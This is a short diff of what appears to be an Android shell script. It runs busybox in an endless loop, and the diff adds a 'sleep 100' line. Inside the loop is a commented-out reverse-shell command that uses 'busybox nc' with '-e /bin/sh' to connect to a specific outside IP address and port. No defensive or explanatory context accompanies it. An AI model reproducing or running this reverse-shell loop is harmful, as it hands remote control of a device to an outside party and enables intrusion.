@@ -11,5 +11,6 @@ while true
 do
   #/data/local/tmp/busybox nc 3.13.191.225 16858 -e /bin/sh
   /data/local/tmp/busybox
+  sleep 100
 done
 
